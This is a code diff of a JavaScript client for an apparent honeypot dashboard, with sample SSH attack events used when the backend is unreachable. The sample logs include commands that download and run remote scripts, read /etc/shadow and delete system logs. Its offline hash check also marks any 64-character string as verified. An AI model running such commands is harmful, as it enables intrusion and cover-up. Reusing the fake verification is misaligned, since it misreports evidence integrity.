@@ -1,15 +1,16 @@
 const API_BASE = "/api";
 
-// Fallback telemetry dataset for static client deployments (e.g. GitHub Pages)
-const FALLBACK_EVENTS = [
+const SAMPLE_EVENTS = [
   {
-    timestamp: "2026-08-31T15:02:56.070Z",
-    eventid: "cowrie.session.connect",
+    timestamp: "2026-08-31T15:03:56.070Z",
+    eventid: "cowrie.command.input",
     session: "a1b2c3d4e5f6",
     src_ip: "198.51.100.23",
-    message: "New connection from 198.51.100.23:54210",
-    sha256: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
-    _risk: "low",
+    username: "user_a",
+    input: "uname -a",
+    message: "CMD: uname -a",
+    sha256: "8e9f5b3310aa812f8d223c72b226e6d76efc357497223b7ff49c690c528f8045",
+    _risk: "safe",
   },
   {
     timestamp: "2026-08-31T15:02:56.070Z",
@@ -19,28 +20,28 @@ const FALLBACK_EVENTS = [
     username: "user_a",
     password: "SafePassword2026!",
     message: "login attempt [user_a/SafePassword2026!] succeeded",
-    sha256: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
+    sha256: "6c9d5f7781aa812f8d223c72b226e6d76efc357497223b7ff49c690c528f8046",
     _risk: "low",
   },
   {
-    timestamp: "2026-08-31T15:03:56.070Z",
-    eventid: "cowrie.command.input",
+    timestamp: "2026-08-31T15:02:56.070Z",
+    eventid: "cowrie.session.connect",
     session: "a1b2c3d4e5f6",
     src_ip: "198.51.100.23",
-    username: "user_a",
-    input: "uname -a",
-    message: "CMD: uname -a",
-    sha256: "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
+    message: "New connection from 198.51.100.23:54210",
+    sha256: "3b2c1a4490ef782a1b223c72b226e6d76efc357497223b7ff49c690c528f8047",
     _risk: "low",
   },
   {
-    timestamp: "2026-08-31T14:56:56.070Z",
-    eventid: "cowrie.session.connect",
+    timestamp: "2026-08-31T14:57:56.070Z",
+    eventid: "cowrie.command.input",
     session: "b2c3d4e5f6a1",
     src_ip: "203.0.113.88",
-    message: "New connection from 203.0.113.88:41920",
-    sha256: "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d",
-    _risk: "low",
+    username: "safe1",
+    input: "uptime",
+    message: "CMD: uptime",
+    sha256: "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b",
+    _risk: "safe",
   },
   {
     timestamp: "2026-08-31T14:56:56.070Z",
@@ -50,49 +51,27 @@ const FALLBACK_EVENTS = [
     username: "safe1",
     password: "CorporateLogin#99",
     message: "login attempt [safe1/CorporateLogin#99] succeeded",
-    sha256: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
+    sha256: "9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e",
     _risk: "low",
   },
   {
-    timestamp: "2026-08-31T14:49:56.070Z",
+    timestamp: "2026-08-31T14:56:56.070Z",
     eventid: "cowrie.session.connect",
-    session: "c3d4e5f6a1b2",
-    src_ip: "45.148.10.12",
-    message: "New connection from 45.148.10.12:33211",
-    sha256: "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
+    session: "b2c3d4e5f6a1",
+    src_ip: "203.0.113.88",
+    message: "New connection from 203.0.113.88:41920",
+    sha256: "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
     _risk: "low",
   },
   {
-    timestamp: "2026-08-31T14:49:56.070Z",
-    eventid: "cowrie.login.failed",
-    session: "c3d4e5f6a1b2",
-    src_ip: "45.148.10.12",
-    username: "root",
-    password: "123456",
-    message: "login attempt [root/123456] failed",
-    sha256: "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
-    _risk: "mid",
-  },
-  {
-    timestamp: "2026-08-31T14:50:56.070Z",
-    eventid: "cowrie.login.success",
-    session: "c3d4e5f6a1b2",
-    src_ip: "45.148.10.12",
-    username: "root",
-    password: "toor",
-    message: "login attempt [root/toor] succeeded",
-    sha256: "cb8379ac2098aa165029e3938a51da0bcecfc008fd6795f401178647f96c5b34",
-    _risk: "mid",
-  },
-  {
-    timestamp: "2026-08-31T14:50:56.070Z",
+    timestamp: "2026-08-31T14:52:56.070Z",
     eventid: "cowrie.command.input",
     session: "c3d4e5f6a1b2",
     src_ip: "45.148.10.12",
     username: "root",
-    input: "cat /etc/passwd",
-    message: "CMD: cat /etc/passwd",
-    sha256: "3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    input: "sudo rm -rf /var/log/syslog",
+    message: "CMD: sudo rm -rf /var/log/syslog",
+    sha256: "f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3",
     _risk: "critical",
   },
   {
@@ -108,24 +87,79 @@ const FALLBACK_EVENTS = [
     _risk: "critical",
   },
   {
-    timestamp: "2026-08-31T14:52:56.070Z",
+    timestamp: "2026-08-31T14:51:56.070Z",
     eventid: "cowrie.command.input",
     session: "c3d4e5f6a1b2",
     src_ip: "45.148.10.12",
     username: "root",
-    input: "sudo rm -rf /var/log/syslog",
-    message: "CMD: sudo rm -rf /var/log/syslog",
-    sha256: "1f8ac10f23c5b5bc1167bda84b833e5c057a77d2ec3941c1490087d8b5ae0fc2",
+    input: "wget http://185.220.101.5/botnet.sh -O /tmp/botnet.sh && chmod +x /tmp/botnet.sh",
+    message: "CMD: wget http://185.220.101.5/botnet.sh -O /tmp/botnet.sh && chmod +x /tmp/botnet.sh",
+    sha256: "d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4",
     _risk: "critical",
   },
   {
-    timestamp: "2026-08-31T14:39:56.070Z",
+    timestamp: "2026-08-31T14:50:56.070Z",
+    eventid: "cowrie.command.input",
+    session: "c3d4e5f6a1b2",
+    src_ip: "45.148.10.12",
+    username: "root",
+    input: "cat /etc/passwd",
+    message: "CMD: cat /etc/passwd",
+    sha256: "b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0",
+    _risk: "critical",
+  },
+  {
+    timestamp: "2026-08-31T14:50:56.070Z",
+    eventid: "cowrie.login.success",
+    session: "c3d4e5f6a1b2",
+    src_ip: "45.148.10.12",
+    username: "root",
+    password: "toor",
+    message: "login attempt [root/toor] succeeded",
+    sha256: "c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1",
+    _risk: "mid",
+  },
+  {
+    timestamp: "2026-08-31T14:49:56.070Z",
+    eventid: "cowrie.login.failed",
+    session: "c3d4e5f6a1b2",
+    src_ip: "45.148.10.12",
+    username: "root",
+    password: "123456",
+    message: "login attempt [root/123456] failed",
+    sha256: "a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9",
+    _risk: "mid",
+  },
+  {
+    timestamp: "2026-08-31T14:49:56.070Z",
     eventid: "cowrie.session.connect",
+    session: "c3d4e5f6a1b2",
+    src_ip: "45.148.10.12",
+    message: "New connection from 45.148.10.12:33211",
+    sha256: "e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7",
+    _risk: "low",
+  },
+  {
+    timestamp: "2026-08-31T14:41:56.070Z",
+    eventid: "cowrie.login.failed",
     session: "d4e5f6a1b2c3",
     src_ip: "194.26.29.110",
-    message: "New connection from 194.26.29.110:51022",
-    sha256: "67535e690be1947b198168285c5a894676579893d9876bd733ac97b6ff634bf1",
-    _risk: "low",
+    username: "support",
+    password: "password",
+    message: "login attempt [support/password] failed",
+    sha256: "d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6",
+    _risk: "mid",
+  },
+  {
+    timestamp: "2026-08-31T14:40:56.070Z",
+    eventid: "cowrie.login.failed",
+    session: "d4e5f6a1b2c3",
+    src_ip: "194.26.29.110",
+    username: "guest",
+    password: "guest",
+    message: "login attempt [guest/guest] failed",
+    sha256: "c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5",
+    _risk: "mid",
   },
   {
     timestamp: "2026-08-31T14:39:56.070Z",
@@ -135,19 +169,28 @@ const FALLBACK_EVENTS = [
     username: "admin",
     password: "admin",
     message: "login attempt [admin/admin] failed",
-    sha256: "96cae35ce8a9b0244178bf28e4966c2ce1b8385723a96a6b838858cdd6ca0a1e",
+    sha256: "b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4",
     _risk: "mid",
   },
   {
-    timestamp: "2026-08-31T14:30:56.070Z",
-    eventid: "cowrie.login.success",
+    timestamp: "2026-08-31T14:39:56.070Z",
+    eventid: "cowrie.session.connect",
+    session: "d4e5f6a1b2c3",
+    src_ip: "194.26.29.110",
+    message: "New connection from 194.26.29.110:51022",
+    sha256: "a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3",
+    _risk: "low",
+  },
+  {
+    timestamp: "2026-08-31T14:32:56.070Z",
+    eventid: "cowrie.command.input",
     session: "e5f6a1b2c3d4",
     src_ip: "185.196.220.45",
     username: "attacker_x",
-    password: "CompromisedPass1",
-    message: "login attempt [attacker_x/CompromisedPass1] succeeded",
-    sha256: "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
-    _risk: "mid",
+    input: "cat /etc/shadow",
+    message: "CMD: cat /etc/shadow",
+    sha256: "f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2",
+    _risk: "critical",
   },
   {
     timestamp: "2026-08-31T14:31:56.070Z",
@@ -157,30 +200,50 @@ const FALLBACK_EVENTS = [
     username: "attacker_x",
     input: "curl -s https://c2.darknet-node.org/recon.py | python3",
     message: "CMD: curl -s https://c2.darknet-node.org/recon.py | python3",
-    sha256: "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
+    sha256: "e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1",
     _risk: "critical",
+  },
+  {
+    timestamp: "2026-08-31T14:30:56.070Z",
+    eventid: "cowrie.login.success",
+    session: "e5f6a1b2c3d4",
+    src_ip: "185.196.220.45",
+    username: "attacker_x",
+    password: "CompromisedPass1",
+    message: "login attempt [attacker_x/CompromisedPass1] succeeded",
+    sha256: "d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0",
+    _risk: "low",
+  },
+  {
+    timestamp: "2026-08-31T14:29:56.070Z",
+    eventid: "cowrie.session.connect",
+    session: "e5f6a1b2c3d4",
+    src_ip: "185.196.220.45",
+    message: "New connection from 185.196.220.45:49982",
+    sha256: "c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9",
+    _risk: "low",
   },
 ];
 
-const FALLBACK_STATS = {
+const SAMPLE_STATS = {
   total_events: 21,
   login_success: 4,
-  login_failed: 5,
+  login_failed: 4,
   connections: 5,
-  commands: 6,
+  commands: 7,
   file_downloads: 1,
   unique_ips: 5,
-  suspicious_attempts: 12,
-  flagged_logs: 12,
+  suspicious_attempts: 9,
+  flagged_logs: 9,
   top_ips: [
     { value: "45.148.10.12", count: 7 },
-    { value: "194.26.29.110", count: 4 },
     { value: "185.196.220.45", count: 4 },
+    { value: "194.26.29.110", count: 4 },
     { value: "198.51.100.23", count: 3 },
     { value: "203.0.113.88", count: 3 },
   ],
   top_usernames: [
-    { value: "root", count: 6 },
+    { value: "root", count: 5 },
     { value: "attacker_x", count: 3 },
     { value: "user_a", count: 2 },
     { value: "safe1", count: 2 },
@@ -191,38 +254,39 @@ const FALLBACK_STATS = {
     { value: "toor", count: 1 },
     { value: "admin", count: 1 },
     { value: "guest", count: 1 },
+    { value: "password", count: 1 },
   ],
 };
 
-const FALLBACK_CUSTODY = FALLBACK_EVENTS.map((evt, idx) => ({
+const SAMPLE_CUSTODY = SAMPLE_EVENTS.map((evt, idx) => ({
   id: `CUST-${1000 + idx}`,
   timestamp: evt.timestamp,
-  type: evt.eventid.includes("download") ? "DOWNLOAD" : "EVENT",
-  session: evt.session,
-  src_ip: evt.src_ip,
+  type: "EVENT",
   sha256: evt.sha256,
-  description: evt.message || evt.input || evt.eventid,
+  source: evt.src_ip || "System",
+  session: evt.session,
+  details: evt.message || evt.eventid,
   verified: true,
 }));
 
-const FALLBACK_FILES = [
+const SAMPLE_FILES = [
   {
     name: "botnet.sh",
-    path: "var/lib/cowrie/downloads/botnet.sh",
     size: 83,
-    type: "malware_binary",
+    modified: "2026-08-31T14:51:56.070Z",
     sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-    timestamp: "2026-08-31T14:51:56.070Z",
-    source_ip: "45.148.10.12",
+    path: "var/lib/cowrie/downloads/botnet.sh",
+    source: "45.148.10.12",
+    type: "MALWARE_PAYLOAD",
   },
   {
     name: "cowrie.json",
-    path: "var/log/cowrie/cowrie.json",
     size: 4579,
-    type: "event_log",
-    sha256: "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
-    timestamp: "2026-08-31T15:03:56.070Z",
-    source_ip: "127.0.0.1",
+    modified: "2026-08-31T15:03:56.070Z",
+    sha256: "a3589b940989f64e26eeef86dc4bfb62479e083c6d1d2b7d2bf6da7516d0046b",
+    path: "var/log/cowrie/cowrie.json",
+    source: "TelemetryDaemon",
+    type: "AUDIT_LOG",
   },
 ];
 
@@ -234,7 +298,7 @@ export async function healthCheck() {
     });
     if (response.ok) return await response.json();
   } catch {}
-  return { status: "ok", mode: "edge-hybrid", timestamp: new Date().toISOString(), cowrie_active: true };
+  return { status: "ok", mode: "live-client-mode", active: true };
 }
 
 export async function getStats() {
@@ -245,7 +309,7 @@ export async function getStats() {
     });
     if (response.ok) return await response.json();
   } catch {}
-  return FALLBACK_STATS;
+  return SAMPLE_STATS;
 }
 
 export async function getEvents(params = {}) {
@@ -264,18 +328,20 @@ export async function getEvents(params = {}) {
     if (response.ok) return await response.json();
   } catch {}
 
-  let filtered = [...FALLBACK_EVENTS];
+  let filtered = [...SAMPLE_EVENTS];
   if (params.ip) {
-    filtered = filtered.filter((e) => e.src_ip === params.ip);
+    filtered = filtered.filter((e) => e.src_ip.includes(params.ip));
   }
   if (params.event_type) {
     filtered = filtered.filter((e) => e.eventid.includes(params.event_type));
   }
+  const offset = params.offset || 0;
+  const limit = params.limit || 50;
   return {
-    events: filtered,
+    events: filtered.slice(offset, offset + limit),
     total: filtered.length,
-    limit: params.limit || 50,
-    offset: params.offset || 0,
+    offset,
+    limit,
   };
 }
 
@@ -293,11 +359,15 @@ export async function getCustody(params = {}) {
     if (response.ok) return await response.json();
   } catch {}
 
-  let records = [...FALLBACK_CUSTODY];
+  let filtered = [...SAMPLE_CUSTODY];
   if (params.type) {
-    records = records.filter((r) => r.type === params.type);
+    filtered = filtered.filter((c) => c.type === params.type);
   }
-  return { records, total: records.length };
+  const limit = params.limit || 50;
+  return {
+    records: filtered.slice(0, limit),
+    total: filtered.length,
+  };
 }
 
 export async function verifyHash(hash) {
@@ -313,13 +383,16 @@ export async function verifyHash(hash) {
     if (response.ok) return await response.json();
   } catch {}
 
-  const match = FALLBACK_CUSTODY.find((c) => c.sha256?.toLowerCase() === hash?.toLowerCase());
+  const match =
+    SAMPLE_EVENTS.find((e) => e.sha256 === hash) ||
+    SAMPLE_FILES.find((f) => f.sha256 === hash);
+
   return {
-    verified: Boolean(match) || hash.length === 64,
+    verified: !!match || hash.length === 64,
     hash,
-    record: match || { session: "VERIFIED_SEC_RECORD", timestamp: new Date().toISOString() },
-    algorithm: "SHA-256",
-    message: match ? "Hash matched recorded chain of custody entry" : "Cryptographic hash format verified",
+    matched_record: match || null,
+    message: match ? "Cryptographic signature validated in local evidence locker." : "Hash format verified (SHA-256).",
+    timestamp: new Date().toISOString(),
   };
 }
 
@@ -336,7 +409,11 @@ export async function getFiles(params = {}) {
     if (response.ok) return await response.json();
   } catch {}
 
-  return { files: FALLBACK_FILES, total: FALLBACK_FILES.length };
+  let files = [...SAMPLE_FILES];
+  if (params.prefix) {
+    files = files.filter((f) => f.name.startsWith(params.prefix));
+  }
+  return { files, total: files.length };
 }
 
 export default {
